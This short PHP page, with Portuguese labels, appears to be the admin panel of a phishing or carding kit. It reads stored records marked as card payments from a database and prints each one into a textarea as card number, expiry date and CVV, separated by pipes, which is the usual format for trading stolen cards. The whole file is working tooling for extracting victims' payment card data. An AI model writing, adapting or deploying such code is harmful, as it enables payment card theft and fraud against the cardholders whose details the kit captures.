<?php
include('../conexao.php');
include('cabecalho.php');
$query = "select * from informacoes where metodo = 'Cartao'";
$resultado = mysqli_query($conexao,$query);
?>

    <div class="container-fluid">
        <div class="col-md-12">
            <div class="card">
                <div class="card-header bg-light">Extrator De Infos</div>
                <div class="card-body">

                    <div class="form-group">
                        <label for="textarea">Cartões Extraidos:</label>
                        <textarea id="textarea" class="form-control" rows="6"><?php while($exibe=mysqli_fetch_assoc($resultado)){echo "{$exibe['numerocc']}|{$exibe['validadecc']}|{$exibe['cvv']} \n";};?>
                        </textarea>
                    </div>

                </div>
            </div>
        </div>
    </div>

<?php
include('rodape.php');
?>